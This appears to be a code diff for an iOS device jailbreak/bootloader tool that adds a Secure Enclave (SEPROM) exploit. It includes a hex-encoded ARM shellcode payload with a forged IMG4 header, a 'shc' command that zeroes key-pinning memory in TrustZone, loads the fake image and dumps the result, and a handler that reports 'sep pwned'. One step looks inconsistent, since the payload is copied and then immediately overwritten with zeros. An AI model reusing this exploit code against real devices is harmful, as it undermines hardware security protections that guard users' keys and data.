@@ -120,6 +120,22 @@ static const uint8_t img4_data[] = {
 };
 
 static const size_t img4_size = sizeof(img4_data);
+
+// 0x30, 0x83, 0x10, 0x40, for IMG4 header, with length > 0x100000 bytes
+// andsmi r8, r0, r0, lsr r3
+unsigned char sep_send_ab_bin[] = {
+    0x30, 0x83, 0x10, 0x40,
+    0x4f, 0xf0, 0x7f, 0xf5, 0x00, 0x00, 0xa0, 0xe3,
+    0x17, 0x0f, 0x08, 0xee, 0x4f, 0xf0, 0x7f, 0xf5, 0x6f, 0xf0, 0x7f, 0xf5,
+    0x10, 0x0f, 0x11, 0xee, 0x01, 0x00, 0x80, 0xe3, 0x10, 0x0f, 0x01, 0xee,
+    0x6f, 0xf0, 0x7f, 0xf5, 0x00, 0x00, 0x00, 0xeb, 0xfe, 0xff, 0xff, 0xea,
+    0xa0, 0x2b, 0x00, 0xe3, 0xa0, 0x2d, 0x43, 0xe3, 0x00, 0x30, 0x92, 0xe5,
+    0x01, 0x08, 0x13, 0xe3, 0x01, 0x00, 0x00, 0x0a, 0x02, 0xf0, 0x20, 0xe3,
+    0xfa, 0xff, 0xff, 0xea, 0xff, 0x00, 0x00, 0xe3, 0xab, 0x00, 0x40, 0xe3,
+    0x00, 0x10, 0xa0, 0xe3, 0x10, 0x00, 0x82, 0xe5, 0x14, 0x10, 0x82, 0xe5,
+    0x1e, 0xff, 0x2f, 0xe1};
+unsigned int sep_send_ab_bin_len = 100;
+
 void (*sepfw_kpf_hook)(void* sepfw_bytes, size_t sepfw_size);
 void sepfw_kpf(void* sepfw_bytes, size_t sepfw_size) {
     uint32_t* insn_stream = sepfw_bytes;
@@ -197,6 +213,8 @@ static inline uint64_t mailbox_read_fast(void) {
     return rd;
 }
 extern void sep_racer(void* observe_b0, void* observe_bs, void* null_b0, void* null_bs, void* replay, uint64_t size, void* shct, void* shv);
+// Must aligned to 64 bytes
+extern void fast_copy(void *dst, const void *src, size_t size);
 void  do_sep_racer(void* observe_b0, void* observe_bs, void* null_b0, void* null_bs, void* replay, uint64_t size, void* shct, void* shv, uint64_t msg) {
     disable_interrupts();
     mailbox_write_fast(msg);
@@ -238,7 +256,13 @@ void sep_handle_msg_from_seprom(union sep_message_u msg) {
         event_fire(&sep_done_tz0_event);
     } else if (msg.msg.opcode == (17 + 100)) {
         event_fire(&sep_done_integrity_tree_event);
-    } else {
+    }
+    else if (msg.msg.opcode == 0xab)
+    {
+        iprintf("sep pwned with opcode %x\n", msg.msg.opcode);
+    }
+    else
+    {
         iprintf("got seprom message %x\n", msg.msg.opcode);
     }
 }
@@ -1249,6 +1273,8 @@ void sep_observe(const char *cmd, char *args)
     map_range(0xc00000000, tz0_base, tz0_size, 3, 2, true);
     tz0_base = 0xc00000000;
     cache_clean_and_invalidate((void *)tz0_base, (size_t)tz0_size);
+    memset((void *)tz0_base, 0, 0x4000);
+    cache_clean_and_invalidate((void *)tz0_base, (size_t)tz0_size);
     if (socnum >= 0x8000) {
         iprintf("performing tz blackbird and tz lockdown\n");
         tz_blackbird();
@@ -1314,7 +1340,66 @@ void sep_observe(const char *cmd, char *args)
         iprintf("%dth observed_value=%llx, at tick=%d\n", i, observed_value[i], changed_tick[i]);
     }
     if (use_fake_img4) {
-        free_contig(fake_img4, 0x2000);
+        free_contig(fake_img4, 0x200000);
+    }
+}
+
+void sep_shc(const char *cmd, char *args)
+{
+    seprom_ping();
+    uint64_t tz0_base, tz0_size;
+    if (!tz_get(0, &tz0_base, &tz0_size))
+    {
+        panic("Failed to get TZ0 bounds");
+    }
+    map_range(0xc00000000, tz0_base, tz0_size, 3, 2, true);
+    tz0_base = 0xc00000000;
+    cache_clean_and_invalidate((void *)tz0_base, (size_t)tz0_size);
+    if (socnum >= 0x8000)
+    {
+        iprintf("performing tz blackbird and tz lockdown\n");
+        tz_blackbird();
+        tz_lockdown();
+    }
+    iprintf("start to boot tz0\n");
+    seprom_boot_tz0_async();
+
+    // key pinning hax
+    for (int x = 0; x < 10000; x++)
+    {
+        *(volatile uint64_t *)((char *)tz0_base + tz0_size - 0x1000 + 0x18) = 0;
+        *(volatile uint64_t *)((char *)tz0_base + tz0_size - 0x1000 + 0x20) = 0;
+        *(volatile uint64_t *)((char *)tz0_base + tz0_size - 0x1000 + 0x28) = 0;
+        *(volatile uint64_t *)((char *)tz0_base + tz0_size - 0x1000 + 0x48) = 0;
+        *(volatile uint64_t *)((char *)tz0_base + tz0_size - 0x1000 + 0x50) = 0;
+        *(volatile uint64_t *)((char *)tz0_base + tz0_size - 0x1000 + 0x58) = 0;
+    }
+    iprintf("finished writing key pinning area\n");
+    // event_wait_asserted(&sep_done_tz0_event);
+    iprintf("seprom booted tz0: %d\n", sep_has_done_tz0);
+    seprom_ping();
+    if (socnum < 0x8000)
+    {
+        // On A8/A8X, we need to load art to sep
+        seprom_artload();
+        iprintf("seprom loaded art: %d\n", seprom_has_accepted_art);
+    }
+    void *fake_img4 = NULL;
+    fake_img4 = alloc_contig(0x200000);
+    memcpy(fake_img4, sep_send_ab_bin, sep_send_ab_bin_len);
+    memset((void *)fake_img4, 0, 0x200000);
+    memset((void *)tz0_base, 0, 0x4000);
+    cache_clean_and_invalidate((void *)fake_img4, (size_t)0x200000);
+    cache_clean_and_invalidate((void *)tz0_base, (size_t)tz0_size);
+    seprom_fwload_async(fake_img4);
+    enable_interrupts();
+    sleep(1);
+    __asm__ volatile("dmb sy\n"
+                     "isb\n" ::
+                         : "memory");
+    for (int i = 0; i < 64 * (sep_send_ab_bin_len + 31) / 32 / 8; i++)
+    {
+        iprintf("0x%llx\n", *(volatile uint64_t *)(tz0_base + i * 8));
     }
 }
 
@@ -1336,6 +1421,7 @@ static struct sep_command command_table[] = {
     SEP_COMMAND("jump", "jump to address", sep_pwned_jump),
     SEP_COMMAND("boot", "boot pwned tz0 image", sep_pwned_boot),
     SEP_COMMAND("observe", "observe how sep works", sep_observe),
+    SEP_COMMAND("shc", "get sep payload shellcode", sep_shc),
 #endif
     SEP_COMMAND("encrypt", "encrypt a kbag (requires pwned SEPROM)", sep_aes_encrypt),
     SEP_COMMAND("decrypt", "decrypt a kbag (requires pwned SEPROM)", sep_aes_decrypt),
